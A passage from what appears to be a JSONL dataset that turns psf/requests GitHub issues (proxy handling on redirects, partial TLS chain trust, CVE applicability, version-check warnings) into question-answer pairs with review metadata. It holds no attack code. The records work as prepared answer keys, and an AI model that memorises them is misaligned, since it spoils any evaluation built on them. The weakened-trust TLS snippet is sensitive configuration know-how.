"comment"}, {"id": "c2", "author": "nateprewitt", "timestamp": "2026-02-19T16:09:25Z", "body": "Hi @bryanfraschetti, I think the check is working as expected. Local distributions and modified copies distributed by Linux distros are intended to flag under this check. This was originally introduced because of popular distros carrying buggy patches that lead to churn for us trying to debug code we didn't own or control. \n\nWe want it to be clear to users when they've installed Requests on a system that may be carrying modified patches or outside of the range of what we validate in CI before shipping. If you are working with a local copy, you should be able to suppress those warnings as needed with:\n\n```python\nwarnings.filterwarnings(\"ignore\", category=RequestsDependencyWarning)\n```", "role": "comment"}, {"id": "c3", "author": "sigmavirus24", "timestamp": "2026-02-19T22:45:04Z", "body": "@nateprewitt the problem is the exception that prevents anything from working while attempting to parse the version string ", "role": "comment"}, {"id": "c4", "author": "nateprewitt", "timestamp": "2026-02-19T22:47:38Z", "body": "Only if you're calling `check_compatibility` directly. We already handled this for cases like urllib3's version used to be `dev` outside of a release. The ValueError gets turned into a warning [here](https://github.com/psf/requests/blob/da9113c0466850a425e554630a732ec1f7d045fc/src/requests/__init__.py#L108-L118) unless I'm missing something?\n\nEdit: I understand that forcing warnings -> errors is an error if that's what was meant. That's a separate issue though not related to Requests imo. We're doing what we intend to.", "role": "comment"}, {"id": "c5", "author": "sigmavirus24", "timestamp": "2026-02-20T00:56:35Z", "body": "Yeah, no sorry. I misread the repro steps from my phone.\n\nI agree filtering the warnings is the right call in this use-case.", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/7035#1", "question": "In psf/requests, when packaging urllib3 with a PEP 440 local version identifier such as `2.0.7+local.1` and installing requests, `check_compatibility` warns after hitting this traceback, which is problematic in CIs configured to treat warnings as failures:\n\n```\n/usr/local/lib/python3.12/dist-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.0.7+local.1) or chardet (None)/charset_normalizer (3.4.2) doesn't match a supported version!\nTraceback (most recent call last):\nFile \"/usr/local/lib/python3.12/dist-packages/requests/__init__.py\", line 109, in <module>\ncheck_compatibility(\nFile \"/usr/local/lib/python3.12/dist-packages/requests/__init__.py\", line 67, in check_compatibility\nmajor, minor, patch = urllib3_version # noqa: F811\n^^^^^^^^^^^^^^^^^^^\nValueError: too many values to unpack (expected 3)\n```\n\nThe `.` in the local version (`+local.1`) is split during `urllib3_version = urllib3_version.split(\".\")`, producing four elements instead of the expected three, and unpacking raises `ValueError`. I expected a version with a local specifier to pass the compatibility check by considering only the public version identifier and ignoring the local version part.\n\nReproduction:\n\n```\npython3 -m venv venv\nsource venv/bin/activate\npip install requests urllib3\npython3\n\nPython 3.12.3 (main, Aug 14 2025, 17:47:21) [GCC 13.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import urllib3\n>>> from requests import check_compatibility\n>>> urllib3.__version__ = \"2.0.7+local.1\"\n>>> check_compatibility(\n...     urllib3_version=urllib3.__version__,\n...     chardet_version=None,\n...     charset_normalizer_version=\"3.2.0\",\n... )\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/home/bryan/requests-repro/venv/lib/python3.12/site-packages/requests/__init__.py\", line 67, in check_compatibility\n    major, minor, patch = urllib3_version  # noqa: F811\n    ^^^^^^^^^^^^^^^^^^^\nValueError: too many values to unpack (expected 3)\n```\n\nShould Requests ignore the local version segment for compatibility checks so local versions do not trigger warnings or exceptions?", "answer": "The maintainer said the check is working as expected: local distributions and modified copies distributed by Linux distros are intended to be flagged, because Requests wants users to know when dependencies may be modified or outside the versions validated in CI. For local copies, suppress the warning if needed with:\n\n```python\nwarnings.filterwarnings(\"ignore\", category=RequestsDependencyWarning)\n```\n\nThey also clarified that the `ValueError` is turned into a warning during normal import; calling `check_compatibility` directly can raise, and treating warnings as errors is separate from Requests\u2019 intended behavior.", "knowledge_type": "grounded", "grounding_sources": ["Requests check_compatibility behavior", "RequestsDependencyWarning"], "answer_grounded_in": "c2", "leak_flags": []}], "answer_in_thread_refs": [], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-17T06:55:21.855233Z", "review_note": ""}
{"id": "psf/requests/issue/6981", "repo": "psf/requests", "number": 6981, "title": "`http_proxy` bug with `starlette.responses.RedirectResponse`", "url": "https://github.com/psf/requests/issues/6981", "state": "closed", "created_at": "2025-07-01T03:18:36Z", "closed_at": "2026-02-10T19:36:32Z", "labels": [], "reporter": "wzh1994", "security_topic": "proxy leakage on HTTP redirects", "qa_summary": "The developer needed to know how to stop proxy information leaking on redirects (i.e., disable use of environment proxies for redirected requests), and the answer provides a concrete fix anchored at the resolve_proxies call in sessions.py line\u202f316 (see the linked source line).", "question_comment_id": "c0", "answer_comment_id": "c2", "question_author": "wzh1994", "answer_author": "nateprewitt", "answerer_role": "maintainer", "artifacts_needed": ["documentation"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "Accepted because the question involves a security-relevant proxy leakage scenario and the answer provides correct, documented mitigation strategies grounded in Requests session proxy handling.", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "wzh1994", "timestamp": "2025-07-01T03:18:36Z", "body": "<!-- Summary. -->\n\nWhen using requests with the http_proxy environment variable set, and explicitly passing `proxies={'http': None, 'https': None}` to bypass the proxy, the first request correctly avoids using the proxy. However, if the request returns a redirect (e.g. 3xx), the redirected request incorrectly picks up the proxy settings from the environment, causing the request to fail.\n\n<!-- What you expected. -->\n\nWhen passing `proxies={'http': None, 'https': None}` to a request, both the original and any redirected requests should bypass the `proxy` and not use the `http_proxy` environment variable.\n\n<!-- What happened instead. -->\n\nOnly the original request respects the `proxies={'http': None, 'https': None}` setting. The redirected request ignores it and uses the proxy from the environment variable, leading to connection errors if the target is not proxy-accessible.\n\n## Reproduction Steps\n\n```python\nimport os\nimport requests\n\n# Set environment variable proxy (simulating a typical corporate environment)\nos.environ['http_proxy'] = 'http://some.invalid.proxy:8080'\n\n# Target URL that redirects to another domain\nurl = \"http://httpbin.org/redirect-to?url=http://example.com\"\n\n# Explicitly disable proxy\nresp = requests.get(url, proxies={'http': None, 'https': None})\nprint(resp.status_code)\n```\n\n# Suggested Fix\nIn [sessions.py line 316](https://github.com/psf/requests/blob/main/src/requests/sessions.py#L316):\n\n`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env)`\nshould be updated to:\n`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env if proxies is None else False)`\n\nThis ensures that when proxies is explicitly passed in by the user (even as None), environment proxies are not used for redirects.\n\n<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,\nplease provide some basic information about your system (Python version,\noperating system, &c). -->\n", "role": "body"}, {"id": "c1", "author": "wzh1994", "timestamp": "2025-07-01T03:54:25Z", "body": "For the time being, I solved the issue by manually setting the `trust_env` attribute of the `Session` object to `False` in the modified `request` function.\n\nRefer\uff1a https://github.com/LazyAGI/LazyLLM/pull/548/files#diff-b02a502a018fbdf49a0af37c6f8c2e971bbd850f4cad1ca6cca54da63cf1ca1cR26", "role": "comment"}, {"id": "c2", "author": "nateprewitt", "timestamp": "2026-02-10T19:36:32Z", "body": "Hi @wzh1994,\n\nI think this is working as intended. While you can disable proxies for the request, any redirects move us outside of the explicitly declared intent of the call. That may lead to unintentional leaking of information to other parties like we see with your example.com redirect. If you want to fully disable use of the system defined proxies, you have a few options:\n\n1.) Create a Session with `trust_env` disabled. You're explicitly disabling use of the system defined proxies for all requests and can freely handle traffic that shouldn't use the proxy. If you have separate requests that need the proxy, you can create a second Session to handle those.\n\n2.) Disable auto-redirects. You can set `allow_redirects=False` and handle each call as needed. This enables you to make decisions on subsequent proxy usage.\n\n3.) If you have specific domains you want to avoid proxy usage, you should be able to set `no_proxy` which will omit those from proxy usage.\n\nThe proposed change is not the correct semantics. A magic value that disables or enables use of environment content that doesn't respect defined values for `trust_env` is a security issue waiting to happen. We're defaulting to the secure decision here and I think we'll keep that for now. The settings above allow for the workflow you're needing and would be our advised options.", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/6981#1", "question": "In psf/requests, when I set the `http_proxy` environment variable and explicitly pass `proxies={'http': None, 'https': None}` to bypass the proxy, the first request avoids the proxy, but if it receives a redirect the redirected request picks up the environment proxy and fails. I expected both the original and redirected requests to bypass the proxy.\n\nReproduction:\n```python\nimport os\nimport requests\n\n# Set environment variable proxy (simulating a typical corporate environment)\nos.environ['http_proxy'] = 'http://some.invalid.proxy:8080'\n\n# Target URL that redirects to another domain\nurl = \"http://httpbin.org/redirect-to?url=http://example.com\"\n\n# Explicitly disable proxy\nresp = requests.get(url, proxies={'http': None, 'https': None})\nprint(resp.status_code)\n```\n\nI suggested changing `sessions.py` line 316 from:\n`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env)`\nto:\n`new_proxies = resolve_proxies(prepared_request, proxies, self.trust_env if proxies is None else False)`\n\nShould redirected requests also honor the explicit `proxies={'http': None, 'https': None}` and avoid environment proxies, or is there another recommended way to fully disable proxy use across redirects?", "answer": "The maintainer said this is working as intended: disabling proxies for the initial request does not necessarily extend to redirects, because redirects move outside the explicitly declared intent and could otherwise leak information. To fully disable system-defined proxies, create a `Session` with `trust_env` disabled; alternatively disable auto-redirects with `allow_redirects=False` and handle each request manually, or use `no_proxy` for domains that should avoid proxy usage. The proposed change was rejected as incorrect semantics and potentially a security issue; Requests is defaulting to the secure behavior.", "knowledge_type": "parametric", "grounding_sources": [], "answer_grounded_in": "c2", "leak_flags": []}], "answer_in_thread_refs": [], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T07:54:20.876329Z", "review_note": ""}
{"id": "psf/requests/issue/6978", "repo": "psf/requests", "number": 6978, "title": "requests fails to connect even if trusted leaf certificate is provided when server's cert chain is incomplete", "url": "https://github.com/psf/requests/issues/6978", "state": "closed", "created_at": "2025-06-27T16:45:54Z", "closed_at": "2026-02-13T02:24:20Z", "labels": [], "reporter": "Ten0", "security_topic": "partial TLS chain verification with Python requests", "qa_summary": "The developer needed to know how to configure requests to trust a leaf certificate when the server's chain is incomplete, which can be done by setting ssl.VERIFY_X509_PARTIAL_CHAIN on an SSLContext (see Python ssl documentation link).", "question_comment_id": "c0", "answer_comment_id": "c8", "question_author": "Ten0", "answer_author": "salykin", "answerer_role": "commenter", "artifacts_needed": ["code", "documentation"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "Accepted because the question addresses TLS certificate chain validation and the answer provides a correct, implementation-level fix grounded in Python SSL security controls.", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "Ten0", "timestamp": "2025-06-27T16:45:54Z", "body": "Say you have a server that provides a cert chain\n\nA -> B -> D\n\nbut D is actually signed by C, which is not provided by the chain.\n\n(Unfortunately I have no control over this particular mistake so I can't get it fixed, and I don't even have a way to obtain C.)\n\nNow obviously I can't just trust A and get things to work, but my problem is that even if I specify that I trust D `verify=\"/path/to/d.pem`, `requests` will still fail to connect.\nThis is in contrast with what `curl` does (`--cacert /path/to/d.pem`), where if the leaf is trusted it doesn't care that it can't find its issuer: it's specified as a root anyway.\n\n## Expected Result\n\n*Connects*\n\n## Actual Result\n\n```\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='192.168.1.1', port=443): Max retries exceeded with url: /ws (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1006)')))\n```\n\n## Reproduction Steps\n\nSpawn an HTTPS server with an incomplete cert chain (e.g. no intermediate certificate).\nMake a request to it using requests.\n\n## System Information\n\n    $ python -m requests.help\n\n```json\n{\n  \"chardet\": {\n    \"version\": null\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.0\"\n  },\n  \"cryptography\": {\n    \"version\": \"\"\n  },\n  \"idna\": {\n    \"version\": \"3.10\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.11.10\"\n  },\n  \"platform\": {\n    \"release\": \"6.12.33\",\n    \"system\": \"Linux\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"\",\n    \"version\": null\n  },\n  \"requests\": {\n    \"version\": \"2.28.2\"\n  },\n  \"system_ssl\": {\n    \"version\": \"30300030\"\n  },\n  \"urllib3\": {\n    \"version\": \"1.26.20\"\n  },\n  \"using_charset_normalizer\": true,\n  \"using_pyopenssl\": false\n}\n```\n", "role": "body"}, {"id": "c1", "author": "DarthCeltic", "timestamp": "2025-09-14T05:35:01Z", "body": "Hello,\n\nI've taken a look at this issue as part of a class project and have identified the root cause. The issue stems from the hardcoded parameters used for the leaf and chain keys, which are too restrictive for certain use cases.\n\nTo address this, I've refactored the code to introduce more flexible parameters. This involved:\n\nAdding a new classification for a single (leaf) key.\n\nImplementing several conditional checks (if/then statements) to handle this new classification.\n\nEnsuring the changes are robust by testing them extensively with pytest.\n\nI've confirmed that these changes resolve the issue in my testing environment. I'm confident this solution addresses the limitations in the current key management logic.\n\nPlease let me know if you have any questions or would like me to provide a pull request. I'm happy to help.\n\n<img width=\"975\" height=\"438\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/29116876-7beb-4afd-9b64-203525d1eeaf\" />\n\n<img width=\"975\" height=\"599\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/851e5111-5da4-497b-a26c-cd84614f9ea9\" />\n\n<img width=\"975\" height=\"292\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8660cf84-a918-4e3f-a189-520c60cce59f\" />", "role": "comment"}, {"id": "c2", "author": "sigmavirus24", "timestamp": "2025-09-14T11:04:15Z", "body": "To be clear @Ten0 have you been able to get leaf only verification working like this with just `openssl s_client`?", "role": "comment"}, {"id": "c3", "author": "Ten0", "timestamp": "2025-09-14T13:37:06Z", "body": "No, as far as I can tell s_client will give `Verify return code: 21 (unable to verify the first certificate)` at least with default parameters.\nMy thought was though, if curl allows this somehow maybe there's an openssl param that can be passed so that this is ignored if lower in the chain is trusted, but I have not investigated further.", "role": "comment"}, {"id": "c4", "author": "sigmavirus24", "timestamp": "2025-09-14T15:01:03Z", "body": "https://docs.python.org/3/library/ssl.html#ssl.VERIFY_X509_PARTIAL_CHAIN is likely what needs to be configured here for requests like this but it isn't something we should be setting by default. The number of items in a trust store isn't a guarantee that the certificate is a leaf to be verified. And to determine an algorithm would require cryptography which we do not have a dependency on any longer to be able to check certain attributes which are not required for anything other than public CAs following baseline requirements from the CA/B Forum. Internal PKI may or may not follow those and thus complicate this. \n\nThis would be easier if we exposed an easy way to pass an SSL context but at the moment it requires a transport adapter that specifies one to urllib3 instead. ", "role": "comment"}, {"id": "c5", "author": "Ten0", "timestamp": "2025-10-01T11:36:00Z", "body": "> [docs.python.org/3/library/ssl.html#ssl.VERIFY_X509_PARTIAL_CHAIN](https://docs.python.org/3/library/ssl.html#ssl.VERIFY_X509_PARTIAL_CHAIN) is likely what needs to be configured here\n\nLooks like it indeed :)\n\n> The number of items in a trust store isn't a guarantee that the certificate is a leaf to be verified.\n\nDefinitely not, but it doesn't look like that option being set by default would imply a such behavior where it checks the number of items in the trust store? It seems instead to do the reasonable thing which is, just trust the intermediate cert as if it was a self-signed cert? (I'm not sure what you mean.)\n\n> but it isn't something we should be setting by default\n\nAs far as I'm concerned that seems pretty reasonable: I don't see what else one could one possibly mean by adding an intermediate cert to the trust store.\nThat is indeed [what curl does](https://github.com/curl/curl/blob/150567b0d25b519873800ac883ae43833e8f6aca/lib/vtls/openssl.c#L3461-L3469), and that opens more room for people to specify certs instead of having to disable certs verification (which is what [I ended up having to do on the software that prompted me to open this issue](https://github.com/Ten0/livebox-python-api/blob/4f62dd5f6ed2a88378e21e814a0af67b0cdc9e42/livebox_api.py#L17-L27)).", "role": "comment"}, {"id": "c6", "author": "sigmavirus24", "timestamp": "2025-10-06T13:41:00Z", "body": "@Ten0 I commented here but was referring to the PR created for this issue issue created by an LLM user where it checks for a single-certificate in the trust bundle.\n\n> It seems instead to do the reasonable thing which is, just trust the intermediate cert as if it was a self-signed cert? (I'm not sure what you mean.)\n\nThis is not how trust chains work. When a server and client are establishing a TLS connection, the server (to ensure that every client might work) _must_ provide:\n\n* it's leaf\n* the issuer of that leaf\n* any and all intermediates leading to the root\n\nSo if you have a architecture that looks like `Root CA -> Intermediate -> Issuer -> Leaf` `Intermediate`, `Issuer`, and `Leaf` [must all be provided by the server](https://github.com/curl/curl/discussions/14009#discussioncomment-9869251). Web browsers can do something called AIA fetching to find missing links in the chain but most non-web-browser clients do not do that, and `openssl` does not give a good way to do this. That means that all that _needs_ to be in the trust store is the Root, not an intermediate. An intermediate is signed by something else, and if we don't trust what signed it, we cannot trust it. That's why trust stores are also called Root Stores.\n\n> > but it isn't something we should be setting by default\n> \n> As far as I'm concerned that seems pretty reasonable:\n\nDo you mean us not setting partial chain by default is reasonable?\n\n> I don't see what else one could one possibly mean by adding an intermediate cert to the trust store. \n\nPeople do things like this without actually understanding why often times. Sometimes because they found it on a random website or because a statistical model tells them to based off some other website it was fed as part of its training data.\n\n> That is indeed [what curl does](https://github.com/curl/curl/blob/150567b0d25b519873800ac883ae43833e8f6aca/lib/vtls/openssl.c#L3461-L3469), and that opens more room for people to specify certs instead of having to disable certs verification (which is what [I ended up having to do on the software that prompted me to open this issue](https://github.com/Ten0/livebox-python-api/blob/4f62dd5f6ed2a88378e21e814a0af67b0cdc9e42/livebox_api.py#L17-L27)).\n\ncurl has specific flags to enable and control this behaviour. We do not have that kind of API surface area. The best way for us to enable this would be for us to accept an SSLContext or something that generates them. Thta isn't something we hvae a good way to add though, especially given our feature-freeze.", "role": "comment"}, {"id": "c7", "author": "Ten0", "timestamp": "2025-10-06T14:59:21Z", "body": "Disclaimer: Of course I am no particular authority on this, I'm just weighing in an opinion as a user with reasonable knowledge of PKIs and security in general, adding to that limited weight that of whoever is responsible for that kind of choice over at curl, to the extent that it can also be considered relevant here.\n\n> This is not how trust chains work\n\nThank you for your time on this explanation. I knew already though: my original message specifies as example a case where server's behavior constitutes a \"mistake\" that would require \"fixing\".\n\nI mean that it sounds reasonable to me (and apparently to the curl people as well), security-wise, to have the same [default](https://github.com/curl/curl/blob/92a212568403d985a2614a7d206bf34b7a8fb827/docs/libcurl/opts/CURLOPT_PROXY_SSL_OPTIONS.md?plain=1#L54-L60) behavior as curl, that is, if people explicitly ask to trust an intermediate, and the leaf has a valid chain leading up to that indermediate, we don't require to also trust the root and have a valid chain leading up to that root, because I do not see what else specifying an intermediate certificate as trusted could possibly mean, considering that as you said, root is otherwise both required and sufficient.\n\n> or because a statistical model tells them to\n\nEven if they did trust an intermediate instead of the root when they trusting the root would have been more appropriate for their use-case, AFAICT that is not a security concern.\n\nI don't see how that would *cause* security issues, and at least I know that [it would *fix mine*](https://github.com/Ten0/livebox-python-api/blob/4f62dd5f6ed2a88378e21e814a0af67b0cdc9e42/livebox_api.py#L17-L27), and I'm not saying this because an LLM told me so. \ud83d\ude05\n\nIn fact, I think that the least things are going to easily work, the more people who don't understand are going to just disable cert verification, which in turn looks like a more likely security issue than any one that would be caused by enabling this option by default.\n\nIt looks like this might also allow use-cases where one could trust less than the root, only a sub-portion of signatories, for a particular application, which could also possibly be more secure than being forced to trust the whole root which would then become a problem if *any* intermediate leaked.\n", "role": "comment"}, {"id": "c8", "author": "salykin", "timestamp": "2025-10-07T07:53:38Z", "body": "In case of a chain `CA` -> `Leaf cert` where CA is unavailable next code works fine:\n```py\nimport requests\nimport ssl\nimport urllib3\n\n\nclass CustomSslAdapter(requests.adapters.HTTPAdapter):\n    def __init__(self, ssl_context=None, **kwargs):\n        self.ssl_context = ssl_context\n        super().__init__(**kwargs)\n    def init_poolmanager(self, connections, maxsize, block=False):\n        self.poolmanager = urllib3.poolmanager.PoolManager(\n            num_pools=connections,\n            maxsize=maxsize,\n            block=block,\n            ssl_context=self.ssl_context\n        )\n\n\nmy_leaf_certs = ['cert.crt']\n\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\ncontext.verify_flags |= ssl.VERIFY_X509_PARTIAL_CHAIN\nfor leaf_cert in my_leaf_certs:\n    context.load_verify_locations(leaf_cert)\n\nsession = requests.Session()\nsession.mount('https://', CustomSslAdapter(ssl_context=context))\n\nresponse = session.get('https://host:port')\nprint(response.status_code)\n```\n\nWith deco implementation:\n```py\ndef verify_x509_partial_chain(my_leaf_certs, ssl_context=None):\n    def deco(get_session_func):\n        def deco2():\n            session = get_session_func()\n            context = ssl_context or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n            context.verify_flags |= ssl.VERIFY_X509_PARTIAL_CHAIN\n            print(context.verify_flags)\n            for leaf_cert in my_leaf_certs:\n                context.load_verify_locations(leaf_cert)\n            session.mount('https://', CustomSslAdapter(ssl_context=context))\n            return session\n        return deco2\n    return deco\n\n@verify_x509_partial_chain(my_leaf_certs=['cert.crt'])\ndef get_session():\n    return requests.Session()\n\n\nsession = get_session()\nresponse = session.get('https://host:port')\nprint(response.status_code)\n```\n\nWith context manager implementation:\n```py\nfrom contextlib import contextmanager\n\n@contextmanager\ndef verify_x509_partial_chain(my_leaf_certs, ssl_context=None):\n    context = ssl_context or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    context.verify_flags |= ssl.VERIFY_X509_PARTIAL_CHAIN\n    for leaf_cert in my_leaf_certs:\n        context.load_verify_locations(leaf_cert)\n    session = requests.Session()\n    session.mount('https://', CustomSslAdapter(ssl_context=context))\n    try:\n        yield session\n    finally:\n        pass\n\nwith verify_x509_partial_chain(my_leaf_certs=['cert.crt']) as session:\n    response = session.get('https://host:port')\n    print(response.status_code)\n```", "role": "comment"}, {"id": "c9", "author": "nateprewitt", "timestamp": "2026-02-13T02:24:20Z", "body": "I think @salykin has what is needed here. I don't think we intend to change our default behavior right now. This can be accomplished with a custom adapter and that has historically be our suggestion for use cases like this. That should be relatively low overhead if it's needed long term.", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/6978#1", "question": "In psf/requests 2.28.2 on Linux with CPython 3.11.10, I need to connect to an HTTPS server whose certificate chain is incomplete. The server provides a chain like `A -> B -> D`, but `D` is actually signed by `C`, and `C` is not provided by the server. I cannot fix the server and cannot obtain `C`. If I explicitly trust `D` by passing `verify=\"/path/to/d.pem\"`, `requests` still fails, while `curl --cacert /path/to/d.pem` connects when the leaf/lower certificate is trusted as a root. I expected the request to connect, but I get:\n\n```text\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='192.168.1.1', port=443): Max retries exceeded with url: /ws (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1006)')))\n```\n\nReproduction: spawn an HTTPS server with an incomplete cert chain, for example no intermediate certificate, and make a request to it using requests.\n\nSystem information from `python -m requests.help`:\n\n```json\n{\n  \"chardet\": {\n    \"version\": null\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.0\"\n  },\n  \"cryptography\": {\n    \"version\": \"\"\n  },\n  \"idna\": {\n    \"version\": \"3.10\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.11.10\"\n  },\n  \"platform\": {\n    \"release\": \"6.12.33\",\n    \"system\": \"Linux\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"\",\n    \"version\": null\n  },\n  \"requests\": {\n    \"version\": \"2.28.2\"\n  },\n  \"system_ssl\": {\n    \"version\": \"30300030\"\n  },\n  \"urllib3\": {\n    \"version\": \"1.26.20\"\n  },\n  \"using_charset_normalizer\": true,\n  \"using_pyopenssl\": false\n}\n```\n\nHow can I make requests connect in this leaf/partial-chain trust scenario, and is this something requests intends to support by default?", "answer": "Use a custom `requests.adapters.HTTPAdapter` that passes a custom `ssl.SSLContext` to urllib3, set `context.verify_flags |= ssl.VERIFY_X509_PARTIAL_CHAIN`, and load the trusted leaf certificate with `context.load_verify_locations(...)`. The maintainers indicated they do not intend to change requests' default behavior right now; this should be accomplished with a custom adapter, which has historically been their suggestion for such use cases.", "knowledge_type": "grounded", "grounding_sources": ["Python ssl.VERIFY_X509_PARTIAL_CHAIN", "requests.adapters.HTTPAdapter", "urllib3.poolmanager.PoolManager ssl_context"], "answer_grounded_in": "c8, c9", "leak_flags": []}], "answer_in_thread_refs": ["https://host:port"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-17T07:00:07.613538Z", "review_note": ""}
{"id": "psf/requests/issue/6976", "repo": "psf/requests", "number": 6976, "title": "Vulnerabilities reported in v2.32.4", "url": "https://github.com/psf/requests/issues/6976", "state": "closed", "created_at": "2025-06-19T14:13:15Z", "closed_at": "2025-06-19T14:18:34Z", "labels": [], "reporter": "gdlxn-ibm", "security_topic": "applicability of reported CVEs to Requests library", "qa_summary": "The developer asked if CVE-2025-50181 and CVE-2025-50182 affect the Requests library, and the maintainer answered they do not, citing the CVE IDs and recommending an urllib3 update.", "question_comment_id": "c0", "answer_comment_id": "c1", "question_author": "gdlxn-ibm", "answer_author": "nateprewitt", "answerer_role": "maintainer", "artifacts_needed": ["advisory", "dependency_manifest"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "gdlxn-ibm", "timestamp": "2025-06-19T14:13:15Z", "body": "Mend is reporting two vulnerabilities in requests v2.23.4 as [CVE-2025-50181](https://www.mend.io/vulnerability-database/CVE-2025-50181) and [CVE-2025-50182](https://www.mend.io/vulnerability-database/CVE-2025-50182).", "role": "body"}, {"id": "c1", "author": "nateprewitt", "timestamp": "2025-06-19T14:18:26Z", "body": "Hi @gdlxn-ibm, these aren't vulnerabilities in Requests. You're free to update urllib3 at your earliest convenience, there is no action to take for this project.", "role": "comment"}, {"id": "c2", "author": "sigmavirus24", "timestamp": "2025-06-19T14:25:27Z", "body": "Also in at least one description it says\n\n> By default, requests and botocore users are not affected\n\nBut nothing says security like false alarms for the *wrong* dependency ", "role": "comment"}, {"id": "c3", "author": "sigmavirus24", "timestamp": "2025-06-19T14:26:58Z", "body": "The second is specific to browser support which requests does not explicitly provide, so if you're leveraging it there (which I doubt) then it affects you. \n\nAs it stands, neither vulnerability affect requests ", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/6976#1", "question": "Mend is reporting two vulnerabilities against psf/requests (issue title says v2.32.4; the report body says requests v2.23.4): CVE-2025-50181 at https://www.mend.io/vulnerability-database/CVE-2025-50181 and CVE-2025-50182 at https://www.mend.io/vulnerability-database/CVE-2025-50182. Are these vulnerabilities in Requests, and is there any action needed in this project?", "answer": "The maintainer answered that these are not vulnerabilities in Requests. They said users can update urllib3 at their earliest convenience, but there is no action to take for the Requests project.", "knowledge_type": "parametric", "grounding_sources": [], "answer_grounded_in": "c1", "leak_flags": []}], "answer_in_thread_refs": [], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-16T03:23:25.848698Z", "review_note": ""}
{"id": "psf/requests/issue/6974", "repo": "psf/requests", "number": 6974, "title": "SSL: CERTIFICATE_VERIFY_FAILED when using custom root CA in Windows", "url": "https://github.com/psf/requests/issues/6974", "state": "closed", "created_at": "2025-06-17T15:43:55Z", "closed_at": "2025-06-18T14:14:00Z", "labels": [], "reporter": "DonNeelin", "security_topic": "SSL certificate verification failure due to missing Authority Key Identifier in OpenSSL 3.0.16 bundled with Python 3.13", "qa_summary": "The developer needed to know why SSL certificate verification fails with a custom root CA on Python 3.13, and the answer cites CPython issue #135408 explaining the failure is due to a missing Authority Key Identifier in the certificate.", "question_comment_id": "c0", "answer_comment_id": "c1", "question_author": "DonNeelin", "answer_author": "nateprewitt", "answerer_role": "commenter", "artifacts_needed": ["documentation", "issue_tracker"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": ["https://github.com/python/cpython/issues/135408"]}, "human_note": "Accepted because the issue is a TLS certificate validation regression and the answer correctly anchors it to a CPython/OpenSSL change with a concrete reproduction path.", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "DonNeelin", "timestamp": "2025-06-17T15:43:55Z", "body": "When accessing external HTTPS sites using requests with pip-system-certs and/or defined cacert with the entire certificate path included the following error appears in all versions of 3.13:\nr = threatSession.get(baseURL + \"/auth/new\", headers=headers) #, headers = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\"})\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\sessions.py\", line 602, in get\nreturn self.request(\"GET\", url, **kwargs)\n~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\sessions.py\", line 589, in request\nresp = self.send(prep, **send_kwargs)\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\sessions.py\", line 703, in send\nr = adapter.send(request, **kwargs)\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\adapters.py\", line 698, in send\nraise SSLError(e, request=request)\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='threatinsight.proofpoint.com', port=443): Max retries exceeded with url: /auth/new (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Authority Key Identifier 